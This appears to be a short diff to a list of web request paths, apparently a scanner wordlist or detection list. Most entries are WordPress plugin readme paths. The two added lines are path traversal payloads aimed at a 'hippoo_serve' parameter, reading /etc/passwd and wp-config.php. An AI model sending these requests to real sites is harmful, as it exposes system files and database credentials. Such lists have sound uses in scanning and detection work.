@@ -172,3 +172,5 @@
 /wp-content/plugins/bookit/readme.txt
 /wp-content/plugins/woocommerce-delivery-notes/readme.txt
 /de2api/user/info
+/?hippoo_serve=../../../../../../../etc/passwd
+/?hippoo_serve=../../../../wp-config.php
